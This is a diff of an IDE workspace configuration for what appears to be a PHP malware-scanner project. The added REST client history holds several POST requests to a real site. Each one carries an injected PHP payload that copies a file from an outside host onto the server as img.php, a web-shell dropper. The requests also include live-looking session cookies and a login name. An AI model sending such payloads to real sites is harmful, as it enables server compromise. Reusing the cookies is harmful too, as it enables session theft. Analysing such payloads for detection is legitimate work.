@@ -5,8 +5,10 @@
   </component>
   <component name="ChangeListManager">
     <list default="true" id="340d8aa7-8099-46bc-b63d-0a81d6f7d953" name="Default" comment="KDSH-21 #time 1h 20m #comment Тестовая версия">
-      <change type="MODIFICATION" beforePath="$PROJECT_DIR$/.idea/dictionaries/Bagdad.xml" afterPath="$PROJECT_DIR$/.idea/dictionaries/Bagdad.xml" />
+      <change type="NEW" beforePath="" afterPath="$PROJECT_DIR$/scanner.js" />
       <change type="MODIFICATION" beforePath="$PROJECT_DIR$/.idea/workspace.xml" afterPath="$PROJECT_DIR$/.idea/workspace.xml" />
+      <change type="MODIFICATION" beforePath="$PROJECT_DIR$/Tests/SomeFunctionsTest.php" afterPath="$PROJECT_DIR$/Tests/SomeFunctionsTest.php" />
+      <change type="MODIFICATION" beforePath="$PROJECT_DIR$/thekadeshi.php" afterPath="$PROJECT_DIR$/thekadeshi.php" />
     </list>
     <list id="eb39d041-89a3-4396-9ac7-53aa9859cef5" name="Failed commit: Default" comment="Попытка слияния" />
     <list id="4f730f25-c8b1-469c-b3b6-8b84827644d9" name="Failed commit: Default (2)" comment="Попытка слияния" />
@@ -35,34 +37,12 @@
   </component>
   <component name="FileEditorManager">
     <leaf SIDE_TABS_SIZE_LIMIT_KEY="300">
-      <file leaf-file-name="ScannerTest.php" pinned="false" current-in-tab="false">
-        <entry file="file://$PROJECT_DIR$/Tests/ScannerTest.php">
-          <provider selected="true" editor-type-id="text-editor">
-            <state relative-caret-position="323">
-              <caret line="19" column="39" selection-start-line="19" selection-start-column="39" selection-end-line="19" selection-end-column="39" />
-              <folding />
-            </state>
-          </provider>
-        </entry>
-      </file>
       <file leaf-file-name="sniffer.php" pinned="false" current-in-tab="false">
         <entry file="file://$PROJECT_DIR$/sniffer.php">
           <provider selected="true" editor-type-id="text-editor">
-            <state relative-caret-position="1122">
-              <caret line="66" column="9" selection-start-line="51" selection-start-column="8" selection-end-line="66" selection-end-column="9" />
-              <folding />
-            </state>
-          </provider>
-        </entry>
-      </file>
-      <file leaf-file-name="thekadeshi.php" pinned="false" current-in-tab="true">
-        <entry file="file://$PROJECT_DIR$/thekadeshi.php">
-          <provider selected="true" editor-type-id="text-editor">
-            <state relative-caret-position="204">
+            <state relative-caret-position="833">
               <caret line="49" column="0" selection-start-line="49" selection-start-column="0" selection-end-line="49" selection-end-column="0" />
-              <folding>
-                <element signature="e#6#111#0#PHP" expanded="true" />
-              </folding>
+              <folding />
             </state>
           </provider>
         </entry>
@@ -70,18 +50,60 @@
       <file leaf-file-name="thekadeshi.inc.php" pinned="false" current-in-tab="false">
         <entry file="file://$PROJECT_DIR$/thekadeshi.inc.php">
           <provider selected="true" editor-type-id="text-editor">
-            <state relative-caret-position="-2147">
+            <state relative-caret-position="4301">
               <caret line="253" column="25" selection-start-line="253" selection-start-column="25" selection-end-line="253" selection-end-column="25" />
               <folding />
             </state>
           </provider>
         </entry>
       </file>
-      <file leaf-file-name=".options" pinned="false" current-in-tab="false">
-        <entry file="file://$PROJECT_DIR$/.thekadeshi/.options">
+      <file leaf-file-name="scanner.js" pinned="false" current-in-tab="false">
+        <entry file="file://$PROJECT_DIR$/scanner.js">
+          <provider selected="true" editor-type-id="text-editor">
+            <state relative-caret-position="306">
+              <caret line="20" column="18" selection-start-line="20" selection-start-column="18" selection-end-line="20" selection-end-column="18" />
+              <folding>
+                <element signature="e#0#43#0" expanded="false" />
+              </folding>
+            </state>
+          </provider>
+        </entry>
+      </file>
+      <file leaf-file-name="thekadeshi.php" pinned="false" current-in-tab="true">
+        <entry file="file://$PROJECT_DIR$/thekadeshi.php">
+          <provider selected="true" editor-type-id="text-editor">
+            <state relative-caret-position="342">
+              <caret line="653" column="9" selection-start-line="653" selection-start-column="9" selection-end-line="653" selection-end-column="9" />
+              <folding />
+            </state>
+          </provider>
+        </entry>
+      </file>
+      <file leaf-file-name="SomeFunctionsTest.php" pinned="false" current-in-tab="false">
+        <entry file="file://$PROJECT_DIR$/Tests/SomeFunctionsTest.php">
+          <provider selected="true" editor-type-id="text-editor">
+            <state relative-caret-position="204">
+              <caret line="12" column="38" selection-start-line="12" selection-start-column="38" selection-end-line="12" selection-end-column="38" />
+              <folding />
+            </state>
+          </provider>
+        </entry>
+      </file>
+      <file leaf-file-name="home.bak.php" pinned="false" current-in-tab="false">
+        <entry file="file://$PROJECT_DIR$/forTest/home.bak.php">
           <provider selected="true" editor-type-id="text-editor">
             <state relative-caret-position="0">
-              <caret line="0" column="0" selection-start-line="0" selection-start-column="0" selection-end-line="0" selection-end-column="0" />
+              <caret line="0" column="77" selection-start-line="0" selection-start-column="53" selection-end-line="0" selection-end-column="77" />
+              <folding />
+            </state>
+          </provider>
+        </entry>
+      </file>
+      <file leaf-file-name="scanner.php" pinned="false" current-in-tab="false">
+        <entry file="file://$PROJECT_DIR$/scanner.php">
+          <provider selected="true" editor-type-id="text-editor">
+            <state relative-caret-position="2142">
+              <caret line="132" column="0" selection-start-line="132" selection-start-column="0" selection-end-line="132" selection-end-column="0" />
               <folding />
             </state>
           </provider>
@@ -119,9 +141,6 @@
   <component name="IdeDocumentHistory">
     <option name="CHANGED_PATHS">
       <list>
-        <option value="$PROJECT_DIR$/forExamine/gallery.php" />
-        <option value="$PROJECT_DIR$/forExamine/uiplugin.php" />
-        <option value="$PROJECT_DIR$/scanner.js" />
         <option value="$PROJECT_DIR$/forTest/virus0143.php" />
         <option value="$PROJECT_DIR$/forTest/virus0001.php" />
         <option value="$PROJECT_DIR$/forTest/404.php" />
@@ -158,17 +177,20 @@
         <option value="$PROJECT_DIR$/forTest/virus0036.php" />
         <option value="&lt;037391e8-ce91-4fea-b633-1a51970969fd&gt;/.thekadeshi/.options" />
         <option value="$PROJECT_DIR$/Tests/FileListTest.php" />
-        <option value="$PROJECT_DIR$/Tests/SomeFunctionsTest.php" />
         <option value="$PROJECT_DIR$/inspector.php" />
-        <option value="$PROJECT_DIR$/forTest/test.php" />
         <option value="$PROJECT_DIR$/test01.php" />
-        <option value="$PROJECT_DIR$/.thekadeshi/signature.log.json" />
         <option value="$PROJECT_DIR$/forExamine/client.php" />
         <option value="$PROJECT_DIR$/forTest/test01.php" />
         <option value="$PROJECT_DIR$/forTest/test02.php" />
         <option value="$PROJECT_DIR$/scanner.php" />
         <option value="$PROJECT_DIR$/thekadeshi.inc.php" />
         <option value="$PROJECT_DIR$/sniffer.php" />
+        <option value="$PROJECT_DIR$/.gitignore" />
+        <option value="$PROJECT_DIR$/inventions/diff.php" />
+        <option value="$PROJECT_DIR$/forTest/test.php" />
+        <option value="$PROJECT_DIR$/.thekadeshi/signature.log.json" />
+        <option value="$PROJECT_DIR$/Tests/SomeFunctionsTest.php" />
+        <option value="$PROJECT_DIR$/scanner.js" />
         <option value="$PROJECT_DIR$/thekadeshi.php" />
       </list>
     </option>
@@ -186,7 +208,7 @@
   <component name="ProjectFrameBounds">
     <option name="x" value="-8" />
     <option name="y" value="-8" />
-    <option name="width" value="1456" />
+    <option name="width" value="1444" />
     <option name="height" value="876" />
   </component>
   <component name="ProjectInspectionProfilesVisibleTreeState">
@@ -265,7 +287,6 @@
     </navigator>
     <panes>
       <pane id="Scratches" />
-      <pane id="Scope" />
       <pane id="ProjectPane">
         <subPane>
           <PATH>
@@ -308,12 +329,59 @@
               <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
             </PATH_ELEMENT>
             <PATH_ELEMENT>
+              <option name="myItemId" value="inventions" />
+              <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
+            </PATH_ELEMENT>
+          </PATH>
+          <PATH>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="antivir" />
+              <option name="myItemType" value="com.intellij.ide.projectView.impl.nodes.ProjectViewProjectNode" />
+            </PATH_ELEMENT>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="antivir" />
+              <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
+            </PATH_ELEMENT>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="forTest" />
+              <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
+            </PATH_ELEMENT>
+          </PATH>
+          <PATH>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="antivir" />
+              <option name="myItemType" value="com.intellij.ide.projectView.impl.nodes.ProjectViewProjectNode" />
+            </PATH_ELEMENT>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="antivir" />
+              <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
+            </PATH_ELEMENT>
+            <PATH_ELEMENT>
               <option name="myItemId" value=".thekadeshi" />
+              <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
+            </PATH_ELEMENT>
+          </PATH>
+          <PATH>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="antivir" />
+              <option name="myItemType" value="com.intellij.ide.projectView.impl.nodes.ProjectViewProjectNode" />
+            </PATH_ELEMENT>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="antivir" />
+              <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
+            </PATH_ELEMENT>
+            <PATH_ELEMENT>
+              <option name="myItemId" value=".thekadeshi" />
+              <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
+            </PATH_ELEMENT>
+            <PATH_ELEMENT>
+              <option name="myItemId" value="checksum" />
               <option name="myItemType" value="com.jetbrains.php.projectView.PhpTreeStructureProvider$1" />
             </PATH_ELEMENT>
           </PATH>
         </subPane>
       </pane>
+      <pane id="Scope" />
     </panes>
   </component>
   <component name="PropertiesComponent">
@@ -324,13 +392,14 @@
     <property name="WebServerToolWindowPanel.toolwindow.show.permissions" value="false" />
     <property name="WebServerToolWindowPanel.toolwindow.highlight.symlinks" value="true" />
     <property name="WebServerToolWindowPanel.toolwindow.highlight.mappings" value="true" />
-    <property name="settings.editor.selected.configurable" value="reference.webide.settings.project.settings.php" />
+    <property name="settings.editor.selected.configurable" value="preferences.pluginManager" />
     <property name="settings.editor.splitter.proportion" value="0.2" />
     <property name="last_opened_file_path" value="$PROJECT_DIR$/../kadeshi/resources/scripts/development/thekadeshi.php" />
     <property name="nodejs_interpreter_path" value="C:/Program Files/nodejs/node" />
     <property name="js.eslint.eslintPackage" value="" />
     <property name="two.files.diff.last.used.file" value="$PROJECT_DIR$/../kadeshi/resources/scripts/development/thekadeshi.php" />
     <property name="javascript.nodejs.core.library.configured.version" value="4.4.5" />
+    <property name="HbShouldOpenHtmlAsHb" value="" />
   </component>
   <component name="RecentsManager">
     <key name="MoveFile.RECENT_KEYS">
@@ -338,17 +407,299 @@
       <recent name="C:\Users\Bagdad\Documents\web\project\antivir\forExamine" />
     </key>
     <key name="CopyFile.RECENT_KEYS">
-      <recent name="C:\Users\Bagdad\Documents\web\project\antivir\forExamine" />
       <recent name="C:\Users\Bagdad\Documents\web\project\antivir\forTest" />
+      <recent name="C:\Users\Bagdad\Documents\web\project\antivir\forExamine" />
       <recent name="C:\Users\Bagdad\Documents\web\project\antivir\.thekadeshi" />
       <recent name="C:\Users\Bagdad\Documents\web\project\antivir" />
       <recent name="C:\Users\Bagdad\Documents\web\project\antivir\virusdie" />
     </key>
   </component>
-  <component name="RunManager" selected="PHP Script.thekadeshi.php">
-    <configuration default="false" name="test01.php" type="JavascriptDebugType" factoryName="JavaScript Debug" temporary="true" nameIsGenerated="true" uri="http://thekadeshi.bagdad.tmweb.ru/test01.php">
-      <method />
-    </configuration>
+  <component name="RestClientSettings">
+    <option name="REQUEST_HISTORY">
+      <list>
+        <RestClientRequest>
+          <option name="biscuits">
+            <list>
+              <Biscuit>
+                <option name="date" value="-1" />
+                <option name="domain" value="rodzem.ru" />
+                <option name="name" value="PHPSESSID" />
+                <option name="path" value="/" />
+                <option name="value" value="k7mpoa33iruvgbvrtjsh7n1l03" />
+              </Biscuit>
+            </list>
+          </option>
+          <option name="httpMethod" value="POST" />
+          <option name="urlBase" value="https://rodzem.ru" />
+          <option name="urlPath" value="" />
+          <option name="headers">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="Accept" />
+                <option name="value" value="*/*" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cache-Control" />
+                <option name="value" value="no-cache" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Content-Type" />
+                <option name="value" value="application/x-www-form-urlencoded" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cookie" />
+                <option name="value" value="BX_USER_ID=476e33e28177f7bba70d68bef75a3f00; _ym_uid=1469422693432721141; BITRIX_SM_LOGIN=seo; BITRIX_SM_SOUND_LOGIN_PLAYED=Y; BITRIX_SM_LAST_SETTINGS=; _ym_isad=1; PHPSESSID=a32e485c955033eaf12f6d02b9647c35; BITRIX_SM_UIDH=ba83a467caaf8f6cc30006ffa495660f; BITRIX_SM_UIDL=seo; __utmt=1; __utma=93380382.1573524484.1469422694.1470639564.1470641601.24; __utmb=93380382.1.10.1470641601; __utmc=93380382; __utmz=93380382.1469422694.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ym_visorc_454451=w; _ga=GA1.2.1573524484.1469422694; _gat_UA-66668832-45=1" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parameters">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="fg" />
+                <option name="value" value="echo copy('http://gsta.ru/x/img.jpg','/var/www/rodzem/data/www/rodzem.ru/img.php');exit;" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parametersEnabled" value="true" />
+          <option name="textToSend" value="" />
+          <option name="filesToSend" value="" />
+        </RestClientRequest>
+        <RestClientRequest>
+          <option name="biscuits">
+            <list>
+              <Biscuit>
+                <option name="date" value="-1" />
+                <option name="domain" value="rodzem.ru" />
+                <option name="name" value="PHPSESSID" />
+                <option name="path" value="/" />
+                <option name="value" value="k7mpoa33iruvgbvrtjsh7n1l03" />
+              </Biscuit>
+            </list>
+          </option>
+          <option name="httpMethod" value="POST" />
+          <option name="urlBase" value="https://rodzem.ru" />
+          <option name="urlPath" value="" />
+          <option name="headers">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="Accept" />
+                <option name="value" value="*/*" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cache-Control" />
+                <option name="value" value="no-cache" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Content-Type" />
+                <option name="value" value="application/x-www-form-urlencoded" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cookie" />
+                <option name="value" value="BX_USER_ID=476e33e28177f7bba70d68bef75a3f00; _ym_uid=1469422693432721141; BITRIX_SM_LOGIN=seo; BITRIX_SM_SOUND_LOGIN_PLAYED=Y; BITRIX_SM_LAST_SETTINGS=; _ym_isad=1; PHPSESSID=a32e485c955033eaf12f6d02b9647c35; BITRIX_SM_UIDH=ba83a467caaf8f6cc30006ffa495660f; BITRIX_SM_UIDL=seo; __utmt=1; __utma=93380382.1573524484.1469422694.1470639564.1470641601.24; __utmb=93380382.1.10.1470641601; __utmc=93380382; __utmz=93380382.1469422694.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ym_visorc_454451=w; _ga=GA1.2.1573524484.1469422694; _gat_UA-66668832-45=1" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parameters">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="fg" />
+                <option name="value" value="echo copy('http://gsta.ru/x/img.png','/var/www/rodzem/data/www/rodzem.ru/img.php');exit;" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parametersEnabled" value="true" />
+          <option name="textToSend" value="" />
+          <option name="filesToSend" value="" />
+        </RestClientRequest>
+        <RestClientRequest>
+          <option name="biscuits">
+            <list>
+              <Biscuit>
+                <option name="date" value="-1" />
+                <option name="domain" value="rodzem.ru" />
+                <option name="name" value="PHPSESSID" />
+                <option name="path" value="/" />
+                <option name="value" value="k7mpoa33iruvgbvrtjsh7n1l03" />
+              </Biscuit>
+            </list>
+          </option>
+          <option name="httpMethod" value="POST" />
+          <option name="urlBase" value="https://rodzem.ru" />
+          <option name="urlPath" value="x/img.jpg" />
+          <option name="headers">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="Accept" />
+                <option name="value" value="*/*" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cache-Control" />
+                <option name="value" value="no-cache" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Content-Type" />
+                <option name="value" value="application/x-www-form-urlencoded" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cookie" />
+                <option name="value" value="BX_USER_ID=476e33e28177f7bba70d68bef75a3f00; _ym_uid=1469422693432721141; BITRIX_SM_LOGIN=seo; BITRIX_SM_SOUND_LOGIN_PLAYED=Y; BITRIX_SM_LAST_SETTINGS=; _ym_isad=1; PHPSESSID=a32e485c955033eaf12f6d02b9647c35; BITRIX_SM_UIDH=ba83a467caaf8f6cc30006ffa495660f; BITRIX_SM_UIDL=seo; __utmt=1; __utma=93380382.1573524484.1469422694.1470639564.1470641601.24; __utmb=93380382.1.10.1470641601; __utmc=93380382; __utmz=93380382.1469422694.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ym_visorc_454451=w; _ga=GA1.2.1573524484.1469422694; _gat_UA-66668832-45=1" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parameters">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="fg" />
+                <option name="value" value="echo copy('http://gsta.ru/x/img.png','/var/www/rodzem/data/www/rodzem.ru/img.php');exit;" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parametersEnabled" value="true" />
+          <option name="textToSend" value="" />
+          <option name="filesToSend" value="" />
+        </RestClientRequest>
+        <RestClientRequest>
+          <option name="biscuits">
+            <list>
+              <Biscuit>
+                <option name="date" value="-1" />
+                <option name="domain" value="rodzem.ru" />
+                <option name="name" value="PHPSESSID" />
+                <option name="path" value="/" />
+                <option name="value" value="k7mpoa33iruvgbvrtjsh7n1l03" />
+              </Biscuit>
+            </list>
+          </option>
+          <option name="httpMethod" value="POST" />
+          <option name="urlBase" value="https://rodzem.ru" />
+          <option name="urlPath" value="x/img.png" />
+          <option name="headers">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="Accept" />
+                <option name="value" value="*/*" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cache-Control" />
+                <option name="value" value="no-cache" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Content-Type" />
+                <option name="value" value="application/x-www-form-urlencoded" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cookie" />
+                <option name="value" value="BX_USER_ID=476e33e28177f7bba70d68bef75a3f00; _ym_uid=1469422693432721141; BITRIX_SM_LOGIN=seo; BITRIX_SM_SOUND_LOGIN_PLAYED=Y; BITRIX_SM_LAST_SETTINGS=; _ym_isad=1; PHPSESSID=a32e485c955033eaf12f6d02b9647c35; BITRIX_SM_UIDH=ba83a467caaf8f6cc30006ffa495660f; BITRIX_SM_UIDL=seo; __utmt=1; __utma=93380382.1573524484.1469422694.1470639564.1470641601.24; __utmb=93380382.1.10.1470641601; __utmc=93380382; __utmz=93380382.1469422694.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ym_visorc_454451=w; _ga=GA1.2.1573524484.1469422694; _gat_UA-66668832-45=1" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parameters">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="fg" />
+                <option name="value" value="echo copy('http://gsta.ru/x/img.png','/var/www/rodzem/data/www/rodzem.ru/img.php');exit;" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parametersEnabled" value="true" />
+          <option name="textToSend" value="" />
+          <option name="filesToSend" value="" />
+        </RestClientRequest>
+        <RestClientRequest>
+          <option name="biscuits">
+            <list>
+              <Biscuit>
+                <option name="date" value="-1" />
+                <option name="domain" value="rodzem.ru" />
+                <option name="name" value="PHPSESSID" />
+                <option name="path" value="/" />
+                <option name="value" value="k7mpoa33iruvgbvrtjsh7n1l03" />
+              </Biscuit>
+            </list>
+          </option>
+          <option name="httpMethod" value="POST" />
+          <option name="urlBase" value="https://rodzem.ru" />
+          <option name="urlPath" value="x/img.png" />
+          <option name="headers">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="Accept" />
+                <option name="value" value="*/*" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cache-Control" />
+                <option name="value" value="no-cache" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Content-Type" />
+                <option name="value" value="application/x-www-form-urlencoded" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parameters">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="fg" />
+                <option name="value" value="echo copy('http://gsta.ru/x/img.png','/var/www/rodzem/data/www/rodzem.ru/img.php');exit;" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parametersEnabled" value="true" />
+          <option name="textToSend" value="" />
+          <option name="filesToSend" value="" />
+        </RestClientRequest>
+        <RestClientRequest>
+          <option name="httpMethod" value="POST" />
+          <option name="urlBase" value="https://rodzem.ru" />
+          <option name="urlPath" value="x/img.png" />
+          <option name="headers">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="Accept" />
+                <option name="value" value="*/*" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cache-Control" />
+                <option name="value" value="no-cache" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parameters">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="fg" />
+                <option name="value" value="echo copy('http://gsta.ru/x/img.png','/var/www/rodzem/data/www/rodzem.ru/img.php');exit;" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parametersEnabled" value="true" />
+          <option name="textToSend" value="" />
+          <option name="filesToSend" value="" />
+        </RestClientRequest>
+        <RestClientRequest>
+          <option name="httpMethod" value="GET" />
+          <option name="urlBase" value="http://gsta.ru" />
+          <option name="urlPath" value="x/img.png" />
+          <option name="headers">
+            <list>
+              <KeyValuePair>
+                <option name="key" value="Accept" />
+                <option name="value" value="*/*" />
+              </KeyValuePair>
+              <KeyValuePair>
+                <option name="key" value="Cache-Control" />
+                <option name="value" value="no-cache" />
+              </KeyValuePair>
+            </list>
+          </option>
+          <option name="parametersEnabled" value="true" />
+          <option name="textToSend" value="" />
+          <option name="filesToSend" value="" />
+        </RestClientRequest>
+      </list>
+    </option>
+  </component>
+  <component name="RunManager" selected="PHP Script.scanner.php">
     <configuration default="false" name="scanner.php" type="PhpLocalRunConfigurationType" factoryName="PHP Console" temporary="true" path="$PROJECT_DIR$/scanner.php">
       <CommandLine>
         <envs>
@@ -359,13 +710,17 @@
       </CommandLine>
       <method />
     </configuration>
-    <configuration default="false" name="inspector.php" type="PhpLocalRunConfigurationType" factoryName="PHP Console" temporary="true" path="$PROJECT_DIR$/inspector.php">
-      <method />
-    </configuration>
     <configuration default="false" name="thekadeshi.php" type="PhpLocalRunConfigurationType" factoryName="PHP Console" temporary="true" path="$PROJECT_DIR$/thekadeshi.php">
       <method />
     </configuration>
     <configuration default="false" name="sniffer.php" type="PhpLocalRunConfigurationType" factoryName="PHP Console" temporary="true" path="$PROJECT_DIR$/sniffer.php">
+      <method />
+    </configuration>
+    <configuration default="false" name="diff.php" type="PhpLocalRunConfigurationType" factoryName="PHP Console" temporary="true" path="$PROJECT_DIR$/inventions/diff.php">
+      <method />
+    </configuration>
+    <configuration default="false" name="FunctionsTest" type="PHPUnitRunConfigurationType" factoryName="PHPUnit" temporary="true">
+      <TestRunner class="FunctionsTest" file="$PROJECT_DIR$/Tests/SomeFunctionsTest.php" scope="Class" />
       <method />
     </configuration>
     <configuration default="true" type="JavascriptDebugType" factoryName="JavaScript Debug">
@@ -415,19 +770,19 @@
       <method />
     </configuration>
     <list size="5">
-      <item index="0" class="java.lang.String" itemvalue="JavaScript Debug.test01.php" />
-      <item index="1" class="java.lang.String" itemvalue="PHP Script.scanner.php" />
-      <item index="2" class="java.lang.String" itemvalue="PHP Script.inspector.php" />
-      <item index="3" class="java.lang.String" itemvalue="PHP Script.thekadeshi.php" />
-      <item index="4" class="java.lang.String" itemvalue="PHP Script.sniffer.php" />
+      <item index="0" class="java.lang.String" itemvalue="PHP Script.scanner.php" />
+      <item index="1" class="java.lang.String" itemvalue="PHP Script.thekadeshi.php" />
+      <item index="2" class="java.lang.String" itemvalue="PHP Script.sniffer.php" />
+      <item index="3" class="java.lang.String" itemvalue="PHP Script.diff.php" />
+      <item index="4" class="java.lang.String" itemvalue="PHPUnit.FunctionsTest" />
     </list>
     <recent_temporary>
       <list size="5">
-        <item index="0" class="java.lang.String" itemvalue="PHP Script.thekadeshi.php" />
-        <item index="1" class="java.lang.String" itemvalue="PHP Script.sniffer.php" />
-        <item index="2" class="java.lang.String" itemvalue="PHP Script.scanner.php" />
-        <item index="3" class="java.lang.String" itemvalue="JavaScript Debug.test01.php" />
-        <item index="4" class="java.lang.String" itemvalue="PHP Script.inspector.php" />
+        <item index="0" class="java.lang.String" itemvalue="PHP Script.scanner.php" />
+        <item index="1" class="java.lang.String" itemvalue="PHPUnit.FunctionsTest" />
+        <item index="2" class="java.lang.String" itemvalue="PHP Script.diff.php" />
+        <item index="3" class="java.lang.String" itemvalue="PHP Script.thekadeshi.php" />
+        <item index="4" class="java.lang.String" itemvalue="PHP Script.sniffer.php" />
       </list>
     </recent_temporary>
   </component>
@@ -539,27 +894,24 @@
       <workItem from="1470114755247" duration="603000" />
       <workItem from="1470155670728" duration="4100000" />
       <workItem from="1470210814638" duration="13435000" />
-    </task>
-    <task id="LOCAL-00010" summary="KDSH-12 #time 1h #progress  #comment Некоторые исправления">
-      <created>1458636887168</created>
-      <option name="number" value="00010" />
-      <option name="presentableId" value="LOCAL-00010" />
-      <option name="project" value="LOCAL" />
-      <updated>1458636887168</updated>
-    </task>
-    <task id="LOCAL-00011" summary="KDSH-54 #time 45m #progress  #comment Рефакторинг">
-      <created>1458711861799</created>
-      <option name="number" value="00011" />
-      <option name="presentableId" value="LOCAL-00011" />
-      <option name="project" value="LOCAL" />
-      <updated>1458711861799</updated>
-    </task>
-    <task id="LOCAL-00012" summary="KDSH-59 #time 2h #done  #comment Верстка добавлена в скрипт">
-      <created>1458824490395</created>
-      <option name="number" value="00012" />
-      <option name="presentableId" value="LOCAL-00012" />
-      <option name="project" value="LOCAL" />
-      <updated>1458824490395</updated>
+      <workItem from="1470242061393" duration="806000" />
+      <workItem from="1470289019533" duration="50000" />
+      <workItem from="1470309268976" duration="6639000" />
+      <workItem from="1470375889044" duration="7053000" />
+      <workItem from="1470547832182" duration="1529000" />
+      <workItem from="1470633750973" duration="6945000" />
+      <workItem from="1470721842851" duration="203000" />
+      <workItem from="1470756515187" duration="1327000" />
+      <workItem from="1470843547484" duration="1532000" />
+      <workItem from="1470891441480" duration="253000" />
+      <workItem from="1470975706385" duration="1830000" />
+      <workItem from="1471240611348" duration="274000" />
+      <workItem from="1471250391740" duration="605000" />
+      <workItem from="1471547974255" duration="1265000" />
+      <workItem from="1471585551051" duration="1215000" />
+      <workItem from="1471862178713" duration="3540000" />
+      <workItem from="1471929782507" duration="3913000" />
+      <workItem from="1472015651917" duration="376000" />
     </task>
     <task id="LOCAL-00013" summary="KDSH-59 #time 5m #done  #comment Правки шрифта">
       <created>1458825945651</created>
@@ -883,22 +1235,31 @@
       <option name="project" value="LOCAL" />
       <updated>1470240840742</updated>
     </task>
-    <option name="localTasksCounter" value="59" />
+    <task id="LOCAL-00059" summary="Пробуем навести порядок :)">
+      <created>1470242156250</created>
+      <option name="number" value="00059" />
+      <option name="presentableId" value="LOCAL-00059" />
+      <option name="project" value="LOCAL" />
+      <updated>1470242156250</updated>
+    </task>
+    <task id="LOCAL-00060" summary="Культура">
+      <created>1470242215007</created>
+      <option name="number" value="00060" />
+      <option name="presentableId" value="LOCAL-00060" />
+      <option name="project" value="LOCAL" />
+      <updated>1470242215007</updated>
+    </task>
+    <task id="LOCAL-00061" summary="KDSH-24 #time 30m Файл поднят из архива, нужно привести функции к культурному виду и прикрутить к будущему сканеру">
+      <created>1470316667656</created>
+      <option name="number" value="00061" />
+      <option name="presentableId" value="LOCAL-00061" />
+      <option name="project" value="LOCAL" />
+      <updated>1470316667656</updated>
+    </task>
+    <option name="localTasksCounter" value="62" />
     <servers />
   </component>
   <component name="TestHistory">
-    <history-entry file="FileListTest - 2016.06.25 at 21h 41m 11s.xml">
-      <configuration name="FileListTest" configurationId="PHPUnitRunConfigurationType" />
-    </history-entry>
-    <history-entry file="FileListTest - 2016.06.25 at 21h 42m 07s.xml">
-      <configuration name="FileListTest" configurationId="PHPUnitRunConfigurationType" />
-    </history-entry>
-    <history-entry file="FileListTest - 2016.06.25 at 21h 42m 46s.xml">
-      <configuration name="FileListTest" configurationId="PHPUnitRunConfigurationType" />
-    </history-entry>
-    <history-entry file="FileListTest - 2016.06.25 at 21h 43m 32s.xml">
-      <configuration name="FileListTest" configurationId="PHPUnitRunConfigurationType" />
-    </history-entry>
     <history-entry file="FileListTest - 2016.06.25 at 21h 44m 51s.xml">
       <configuration name="FileListTest" configurationId="PHPUnitRunConfigurationType" />
     </history-entry>
@@ -917,38 +1278,50 @@
     <history-entry file="FunctionsTest - 2016.07.01 at 14h 01m 37s.xml">
       <configuration name="FunctionsTest" configurationId="PHPUnitRunConfigurationType" />
     </history-entry>
